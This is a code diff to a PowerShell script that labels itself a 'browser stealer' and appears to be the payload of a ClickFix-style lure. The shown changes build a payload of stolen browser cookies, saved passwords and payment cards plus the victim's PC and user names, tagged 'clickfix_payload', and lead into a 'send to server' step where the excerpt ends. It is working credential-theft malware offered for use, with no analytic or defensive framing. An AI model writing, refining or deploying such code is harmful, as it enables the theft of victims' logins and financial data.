@@ -1,6 +1,5 @@
 # ============================================================
-# BROWSER STEALER — CLEAN WORKING VERSION
-# Downloads SQLite from your server — no fancy headers
+# BROWSER STEALER — CLEAN WORKING VERSION (PC Name Fixed)
 # ============================================================
 
 $ErrorActionPreference = "Continue"
@@ -292,21 +291,35 @@ if ($allCookies.Count -eq 0 -and $allPasswords.Count -eq 0 -and $allCards.Count 
 }
 
 # ============================================================
-# SEND TO SERVER
+# BUILD PAYLOAD — INCLUDES PC NAME IN FINGERPRINT
 # ============================================================
+
+$pcName = $env:COMPUTERNAME
+$userName = $env:USERNAME
 
 $payload = @{
     cookies = $allCookies
     passwords = $allPasswords
     cards = $allCards
     system = @{
-        hostname = $env:COMPUTERNAME
-        username = $env:USERNAME
+        hostname = $pcName
+        username = $userName
     }
+    fingerprint = @{
+        hostname = $pcName
+        userAgent = "PowerShell Payload"
+        browser = "PowerShell"
+        screen = "N/A"
+    }
+    domain = $pcName
     source = "clickfix_payload"
     timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
-    pcName = $env:COMPUTERNAME
+    pcName = $pcName
 }
+
+# ============================================================
+# SEND TO SERVER
+# ============================================================
 
 Write-Log "[+] Sending data to server..."
 try {
